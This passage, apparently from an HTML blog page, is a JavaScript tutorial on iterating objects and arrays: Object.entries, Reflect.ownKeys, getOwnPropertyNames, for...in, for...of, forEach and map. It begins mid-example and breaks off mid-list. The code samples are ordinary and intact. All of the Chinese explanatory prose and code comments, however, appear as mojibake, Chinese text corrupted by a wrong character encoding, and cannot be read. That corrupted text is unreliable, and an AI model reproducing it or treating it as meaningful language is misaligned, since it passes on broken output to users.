<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...ofç»“åˆ</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Key: <span class="hljs-subst">${key}</span>, Value: <span class="hljs-subst">${value}</span>`</span>);
}
<span class="hljs-comment">// è¾“å‡º: Key: name, Value: Alice; Key: age, Value: 25; Key: occupation, Value: Engineer</span>

<span class="hljs-comment">// forEachç»“åˆ</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Key: <span class="hljs-subst">${key}</span>, Value: <span class="hljs-subst">${value}</span>`</span>);
});
<span class="hljs-comment">// åŒæ ·è¾“å‡ºä¸‰ä¸ªé”®å€¼å¯¹</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>ä»…éå†è‡ªæœ‰å±æ€§</strong>ï¼šä¸ Object.keys () å’Œ Object.values () ä¸€æ ·ï¼ŒObject.entries () ä¹Ÿä»…éå†å¯¹è±¡è‡ªèº«çš„å¯æšä¸¾å±æ€§ã€‚</li>
<li><strong>è¿”å›é”®å€¼å¯¹æ•°ç»„</strong>ï¼šæ¯ä¸ªé”®å€¼å¯¹ä»¥æ•°ç»„å½¢å¼è¿”å›ï¼Œç´¢å¼• 0 ä¸ºé”®ï¼Œç´¢å¼• 1 ä¸ºå€¼ï¼Œæ”¯æŒæ•°ç»„è§£æ„èµ‹å€¼ã€‚</li>
<li><strong>ESLint æ¨è</strong>ï¼šå½“éœ€è¦åŒæ—¶è®¿é—®é”®å’Œå€¼æ—¶ï¼ŒObject.entries () æ˜¯æ¯” for...in æ›´å®‰å…¨çš„é€‰æ‹©ã€‚</li>
<li><strong>è¿”å›å€¼æ˜¯æ•°ç»„</strong>ï¼šObject.entries () è¿”å›çš„æ˜¯æ•°ç»„ï¼Œå¯ç»“åˆæ•°ç»„æ–¹æ³•è¿›è¡Œå¤æ‚æ“ä½œã€‚</li>
</ul>
<h4 data-id="heading-6">Reflect.ownKeys()</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(object);
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šReflect.ownKeys () è¿”å›å¯¹è±¡æ‰€æœ‰è‡ªæœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾å±æ€§å’Œ Symbol ç±»å‹çš„å±æ€§ï¼‰çš„é”®é›†åˆï¼Œæ˜¯éå†å¯¹è±¡æ‰€æœ‰å±æ€§çš„æœ€å…¨é¢æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// æ·»åŠ ä¸å¯æšä¸¾å±æ€§</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person, <span class="hljs-string">'id'</span>, {
  <span class="hljs-attr">value</span>: <span class="hljs-number">1001</span>,
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// ä¸å¯æšä¸¾</span>
});

<span class="hljs-comment">// æ·»åŠ Symbolç±»å‹å±æ€§</span>
person[<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)] = <span class="hljs-string">'abc123'</span>;

<span class="hljs-keyword">const</span> allKeys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allKeys); 
<span class="hljs-comment">// è¾“å‡º: ['name', 'age', 'occupation', 'id', Symbol(secret)]</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>åŒ…å«æ‰€æœ‰è‡ªæœ‰å±æ€§</strong>ï¼šåŒ…æ‹¬å¯æšä¸¾å’Œä¸å¯æšä¸¾çš„å±æ€§ï¼Œä¸å— enumerable å±æ€§å½±å“ã€‚</li>
<li><strong>æ”¯æŒ Symbol ç±»å‹çš„é”®</strong>ï¼šä¸ Object.keys () ä¸åŒï¼ŒReflect.ownKeys () å¯ä»¥è¿”å› Symbol ç±»å‹çš„é”®ã€‚</li>
<li><strong>ä¸éå†ç»§æ‰¿å±æ€§</strong>ï¼šä»…éå†å¯¹è±¡è‡ªèº«çš„å±æ€§ï¼Œä¸åŒ…å«åŸå‹é“¾ä¸Šçš„å±æ€§ã€‚</li>
<li><strong>è¿”å›æ•°ç»„</strong>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰è‡ªæœ‰å±æ€§é”®çš„æ•°ç»„ï¼Œå¯ä»¥åƒå…¶ä»–æ•°ç»„ä¸€æ ·è¿›è¡Œæ“ä½œã€‚</li>
<li><strong>æ€§èƒ½è€ƒé‡</strong>ï¼šç›¸æ¯” Object.keys ()ï¼ŒReflect.ownKeys () å¯èƒ½ç¨æ…¢ï¼Œå› ä¸ºéœ€è¦å¤„ç†æ›´å¤šç±»å‹çš„é”®ï¼ˆä¸å¯æšä¸¾ã€Symbolï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-7">å…¶ä»–è‡ªæœ‰å±æ€§æ–¹æ³•</h4>
<p>JavaScript è¿˜æä¾›äº†å…¶ä»–å‡ ç§éå†å¯¹è±¡è‡ªæœ‰å±æ€§çš„æ–¹æ³•ï¼Œé€‚ç”¨äºç‰¹å®šåœºæ™¯ï¼š</p>
<h5 data-id="heading-8">1. Object.getOwnPropertyNames()</h5>
<ul>
<li>
<p><strong>è¯­æ³•</strong>ï¼š<code>Object.getOwnPropertyNames(object)</code></p>
</li>
<li>
<p><strong>ç”¨æ³•</strong>ï¼šè¿”å›å¯¹è±¡æ‰€æœ‰è‡ªæœ‰å±æ€§åï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾çš„ï¼‰çš„æ•°ç»„ï¼Œä½†ä¸åŒ…å« Symbol ç±»å‹çš„é”®ã€‚</p>
</li>
<li>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person, <span class="hljs-string">'id'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> });

<span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(keys); <span class="hljs-comment">// è¾“å‡º: ['name', 'age', 'id']</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-9">2. Object.getOwnPropertySymbols()</h5>
<ul>
<li>
<p><strong>è¯­æ³•</strong>ï¼š<code>Object.getOwnPropertySymbols(object)</code></p>
</li>
<li>
<p><strong>ç”¨æ³•</strong>ï¼šè¿”å›å¯¹è±¡æ‰€æœ‰è‡ªæœ‰ Symbol ç±»å‹å±æ€§åçš„æ•°ç»„ï¼Œä»…åŒ…å« Symbol ç±»å‹çš„é”®ã€‚</p>
</li>
<li>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)]: <span class="hljs-string">'abc123'</span>
};

<span class="hljs-keyword">const</span> symbols = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(symbols); <span class="hljs-comment">// è¾“å‡º: [Symbol(secret)]</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-10">3. for...in å¾ªç¯ + hasOwnProperty</h5>
<ul>
<li>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> object) {
  <span class="hljs-keyword">if</span> (object.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-comment">// å¤„ç†å±æ€§</span>
  }
}
</code></pre>
</li>
<li>
<p><strong>ç”¨æ³•</strong>ï¼šé€šè¿‡ hasOwnProperty è¿‡æ»¤ç»§æ‰¿å±æ€§ï¼Œä»…éå†å¯¹è±¡è‡ªèº«çš„å±æ€§ï¼Œæ˜¯ for...in çš„å®‰å…¨ç”¨æ³•ã€‚</p>
</li>
<li>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};

<span class="hljs-comment">// ç»™åŸå‹æ·»åŠ å±æ€§ï¼ˆç»§æ‰¿å±æ€§ï¼‰</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">'female'</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-keyword">if</span> (person.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
  }
}
<span class="hljs-comment">// è¾“å‡º: name: Alice, age: 25ï¼ˆè¿‡æ»¤äº†genderå±æ€§ï¼‰</span>
</code></pre>
</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>æ€§èƒ½å·®å¼‚</strong>ï¼šObject.getOwnPropertyNames () å’Œ Object.getOwnPropertySymbols () ç›¸æ¯” Object.keys () ä¼šè¿”å›æ›´å¤šå±æ€§ï¼Œä½†æ€§èƒ½ç•¥ä½ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå½“éœ€è¦éå†æ‰€æœ‰è‡ªæœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾çš„ï¼‰æ—¶ï¼Œä½¿ç”¨è¿™äº›æ–¹æ³•ï¼›å½“ä»…éœ€å¯æšä¸¾å±æ€§æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ Object.keys ()/values ()/entries ()ã€‚</li>
<li><strong>Symbol é”®çš„ç‰¹æ®Šæ€§</strong>ï¼šSymbol ç±»å‹çš„é”®ä¸ä¼šè¢« for...inã€Object.keys () ç­‰æ–¹æ³•æ•è·ï¼Œéœ€ä½¿ç”¨ Reflect.ownKeys () æˆ– Object.getOwnPropertySymbols () ä¸“é—¨å¤„ç†ã€‚</li>
</ul>
<h3 data-id="heading-11">æ•°ç»„éå†æ–¹æ³•</h3>
<h4 data-id="heading-12">ä¼ ç»Ÿ for å¾ªç¯</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-comment">// ä½¿ç”¨array[i]è®¿é—®å…ƒç´ </span>
}
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šä¼ ç»Ÿ for å¾ªç¯æ˜¯æœ€åŸºç¡€çš„æ•°ç»„éå†æ–¹å¼ï¼Œé€šè¿‡ç´¢å¼•æ§åˆ¶å¾ªç¯æµç¨‹ï¼Œæ”¯æŒçµæ´»çš„å¾ªç¯æ§åˆ¶ï¼ˆbreakã€continueã€returnï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// éå†æ•°ç»„å¹¶æ‰“å°å…ƒç´ </span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${i}</span>: <span class="hljs-subst">${numbers[i]}</span>`</span>);
}
<span class="hljs-comment">// è¾“å‡º: Index 0: 1; Index 1: 2; ...; Index 4: 5</span>

<span class="hljs-comment">// éå†æ•°ç»„å¹¶ä¿®æ”¹å…ƒç´ </span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  numbers[i] = numbers[i] * <span class="hljs-number">2</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers); <span class="hljs-comment">// è¾“å‡º: [2, 4, 6, 8, 10]</span>

<span class="hljs-comment">// ä¸­æ–­å¾ªç¯ï¼ˆæ‰¾åˆ°ç¬¬ä¸€ä¸ªå¶æ•°ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">if</span> (numbers[i] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç¬¬ä¸€ä¸ªå¶æ•°: <span class="hljs-subst">${numbers[i]}</span>`</span>);
    <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>
<p><strong>å®Œå…¨æ§åˆ¶å¾ªç¯</strong>ï¼šæ”¯æŒ breakï¼ˆä¸­æ–­å¾ªç¯ï¼‰ã€continueï¼ˆè·³è¿‡å½“å‰è¿­ä»£ï¼‰ã€returnï¼ˆé€€å‡ºå‡½æ•°ï¼‰ç­‰æ§åˆ¶è¯­å¥ã€‚</p>
</li>
<li>
<p><strong>å¯ä¿®æ”¹åŸæ•°ç»„</strong>ï¼šé€šè¿‡ç´¢å¼•ç›´æ¥è®¿é—®å…ƒç´ ï¼Œå¯ç›´æ¥ä¿®æ”¹åŸæ•°ç»„çš„å€¼ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½æœ€ä½³</strong>ï¼šåœ¨å¤§å‹æ•°ç»„éå†ä¸­ï¼Œä¼ ç»Ÿ for å¾ªç¯çš„æ€§èƒ½é€šå¸¸ä¼˜äº forEachã€map ç­‰æ–¹æ³•ï¼ˆå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç´¢å¼•ç®¡ç†</strong>ï¼šéœ€è¦æ‰‹åŠ¨ç®¡ç†ç´¢å¼•å˜é‡ï¼ˆi çš„åˆå§‹åŒ–ã€æ¡ä»¶åˆ¤æ–­ã€é€’å¢ï¼‰ï¼Œå®¹æ˜“å‡ºç°ç´¢å¼•é”™è¯¯ï¼ˆå¦‚æ•°ç»„è¶Šç•Œï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç¼“å­˜æ•°ç»„é•¿åº¦</strong>ï¼šå¯¹äºé•¿åº¦å›ºå®šçš„æ•°ç»„ï¼Œå¯ç¼“å­˜ length å±æ€§ä»¥æé«˜æ€§èƒ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> len = numbers.<span class="hljs-property">length</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
  <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-13">for...of å¾ªç¯</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> element <span class="hljs-keyword">of</span> array) {
  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨element</span>
}
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šfor...of å¾ªç¯æ˜¯ ES6 å¼•å…¥çš„éå†å¯è¿­ä»£å¯¹è±¡ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ã€Mapã€Set ç­‰ï¼‰çš„æ–¹æ³•ï¼Œç›´æ¥éå†å…ƒç´ å€¼ï¼Œæ— éœ€ç´¢å¼•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// éå†æ•°ç»„å…ƒç´ </span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> numbers) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
}
<span class="hljs-comment">// è¾“å‡º: 1, 2, 3, 4, 5</span>

<span class="hljs-comment">// éå†æ•°ç»„å¹¶è·å–ç´¢å¼•ï¼ˆç»“åˆArray.prototype.entries()ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [index, num] <span class="hljs-keyword">of</span> numbers.<span class="hljs-title function_">entries</span>()) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${index}</span>: <span class="hljs-subst">${num}</span>`</span>);
}
<span class="hljs-comment">// è¾“å‡º: Index 0: 1; Index 1: 2; ...; Index 4: 5</span>

<span class="hljs-comment">// éå†å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">const</span> str = <span class="hljs-string">'hello'</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> char <span class="hljs-keyword">of</span> str) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(char);
}
<span class="hljs-comment">// è¾“å‡º: h, e, l, l, o</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li><strong>ç›´æ¥éå†å…ƒç´ </strong>ï¼šæ— éœ€æ‰‹åŠ¨ç®¡ç†ç´¢å¼•ï¼Œç›´æ¥è®¿é—®å…ƒç´ å€¼ï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
<li><strong>æ”¯æŒå¯è¿­ä»£å¯¹è±¡</strong>ï¼šé™¤æ•°ç»„å¤–ï¼Œè¿˜æ”¯æŒéå†å­—ç¬¦ä¸²ã€Mapã€Setã€Generator ç­‰å¯è¿­ä»£å¯¹è±¡ã€‚</li>
<li><strong>å¯ä¸­æ–­å¾ªç¯</strong>ï¼šæ”¯æŒ breakã€continueã€return ç­‰æ§åˆ¶è¯­å¥ï¼Œå¯æå‰ç»ˆæ­¢å¾ªç¯ã€‚</li>
<li><strong>ä¸éå†éæ•°å­—å±æ€§</strong>ï¼šä¸ for...in ä¸åŒï¼Œfor...of ä»…éå†æ•°ç»„çš„æ•°å­—ç´¢å¼•å±æ€§ï¼Œä¸ä¼šéå†éæ•°å­—å±æ€§ï¼ˆå¦‚æ•°ç»„çš„è‡ªå®šä¹‰å±æ€§ï¼‰ã€‚</li>
<li><strong>ä¸æ”¯æŒä¿®æ”¹æ•°ç»„é•¿åº¦</strong>ï¼šåœ¨å¾ªç¯ä¸­ä¿®æ”¹æ•°ç»„é•¿åº¦å¯èƒ½å¯¼è‡´éå†ä¸å®Œæ•´æˆ–é‡å¤éå†ï¼ˆå»ºè®®é¿å…ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-14">forEach () æ–¹æ³•</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">array.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}, [thisArg]);
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>currentValue</code>ï¼šå½“å‰éå†çš„å…ƒç´ ã€‚</li>
<li><code>index</code>ï¼ˆå¯é€‰ï¼‰ï¼šå½“å‰å…ƒç´ çš„ç´¢å¼•ã€‚</li>
<li><code>array</code>ï¼ˆå¯é€‰ï¼‰ï¼šè¢«éå†çš„åŸæ•°ç»„ã€‚</li>
<li><code>thisArg</code>ï¼ˆå¯é€‰ï¼‰ï¼šå›è°ƒå‡½æ•°ä¸­ this çš„æŒ‡å‘å¯¹è±¡ã€‚</li>
</ul>
<p><strong>ç”¨æ³•</strong>ï¼šforEach () æ–¹æ³•å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œä¸€æ¬¡å›è°ƒå‡½æ•°ï¼Œæ— è¿”å›å€¼ï¼Œä»…ç”¨äºéå†æ‰§è¡Œæ“ä½œã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// åŸºç¡€ç”¨æ³•</span>
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
});
<span class="hljs-comment">// è¾“å‡º: 1, 2, 3, 4, 5</span>

<span class="hljs-comment">// å¸¦ç´¢å¼•å‚æ•°</span>
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${index}</span>: Value <span class="hljs-subst">${num}</span>`</span>);
});
<span class="hljs-comment">// è¾“å‡º: Index 0: Value 1; Index 1: Value 2; ...; Index 4: Value 5</span>

<span class="hljs-comment">// ä½¿ç”¨thisArgå‚æ•°</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">multiplier</span>: <span class="hljs-number">2</span> };
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num * <span class="hljs-variable language_">this</span>.<span class="hljs-property">multiplier</span>); <span class="hljs-comment">// thisæŒ‡å‘obj</span>
}, obj);
<span class="hljs-comment">// è¾“å‡º: 2, 4, 6, 8, 10</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>
<p><strong>æ— è¿”å›å€¼</strong>ï¼šforEach () ä¸è¿”å›æ–°æ•°ç»„ï¼Œä»…æ‰§è¡Œæ“ä½œï¼ˆè‹¥éœ€è¿”å›ç»“æœï¼Œåº”ä½¿ç”¨ mapã€filter ç­‰æ–¹æ³•ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ— æ³•ä¸­æ–­å¾ªç¯</strong>ï¼šä¸æ”¯æŒ break å’Œ continueï¼Œæ— æ³•æå‰ç»ˆæ­¢å¾ªç¯ï¼ˆå³ä½¿æŠ›å‡ºå¼‚å¸¸ä¹Ÿä¸æ¨èï¼‰ã€‚</p>
</li>
<li>
<p><strong>å›è°ƒå‡½æ•°ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>è‹¥ä½¿ç”¨æ™®é€šå‡½æ•°ä½œä¸ºå›è°ƒï¼Œthis å€¼ç”± thisArg å‚æ•°æŒ‡å®šï¼›</li>
<li>è‹¥ä½¿ç”¨ç®­å¤´å‡½æ•°ï¼ŒthisArg å‚æ•°æ— æ•ˆï¼Œthis æŒ‡å‘å¤–å±‚ä½œç”¨åŸŸçš„ thisã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸æ”¹å˜åŸæ•°ç»„</strong>ï¼šforEach () æœ¬èº«ä¸ä¼šä¿®æ”¹åŸæ•°ç»„ï¼Œä½†è‹¥åœ¨å›è°ƒå‡½æ•°ä¸­æ˜¾å¼ä¿®æ”¹å…ƒç´ ï¼ˆå¦‚<code>array[index] = num * 2</code>ï¼‰ï¼Œåˆ™ä¼šæ”¹å˜åŸæ•°ç»„ã€‚</p>
</li>
<li>
<p><strong>ESLint è­¦å‘Š</strong>ï¼šæŸäº› ESLint é…ç½®ï¼ˆå¦‚<code>no-foreach</code>ï¼‰ä¼šè­¦å‘Šä½¿ç”¨ forEachï¼Œå› ä¸ºå®ƒå¯èƒ½éšè—å‰¯ä½œç”¨ï¼ˆå»ºè®®ä¼˜å…ˆä½¿ç”¨å‡½æ•°å¼æ–¹æ³•ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-15">map () æ–¹æ³•</h4>
<p><strong>è¯­æ³•</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> newArray = array.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// å¤„ç†é€»è¾‘ï¼Œè¿”å›æ–°å€¼</span>
}, [thisArg]);
</code></pre>
<p><strong>ç”¨æ³•</strong>ï¼šmap () æ–¹æ³•å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå°†å›è°ƒå‡½æ•°çš„è¿”å›å€¼ç»„æˆæ–°æ•°ç»„è¿”å›ï¼ŒåŸæ•°ç»„ä¿æŒä¸å˜ã€‚é€‚ç”¨äºæ•°ç»„å…ƒç´ çš„è½¬æ¢æ“ä½œã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// åŸºç¡€è½¬æ¢ï¼ˆæ•°å€¼ç¿»å€ï¼‰</span>
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(doubled); <span class="hljs-comment">// è¾“å‡º: [2, 4, 6, 8, 10]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers); <span class="hljs-comment">// åŸæ•°ç»„ä¸å˜: [1, 2, 3, 4, 5]</span>

<span class="hljs-comment">// è½¬æ¢ä¸ºå¯¹è±¡æ•°ç»„</span>
<span class="hljs-keyword">const</span> objects = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> ({
  <span class="hljs-attr">id</span>: index,
  <span class="hljs-attr">value</span>: num,
  <span class="hljs-attr">squared</span>: num * num
}));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(objects);
<span class="hljs-comment">// è¾“å‡º: [</span>
<span class="hljs-comment">//   { id: 0, value: 1, squared: 1 },</span>
<span class="hljs-comment">//   { id: 1, value: 2, squared: 4 },</span>
<span class="hljs-comment">//   ...</span>
<span class="hljs-comment">// ]</span>

<span class="hljs-comment">// å­—ç¬¦ä¸²å¤„ç†</span>
<span class="hljs-keyword">const</span> names = [<span class="hljs-string">'alice'</span>, <span class="hljs-string">'bob'</span>, <span class="hljs-string">'charlie'</span>];
<span class="hljs-keyword">const</span> capitalized = names.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> name.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toUpperCase</span>() + name.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(capitalized); <span class="hljs-comment">// è¾“å‡º: ['Alice', 'Bob', 'Charlie']</span>
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>
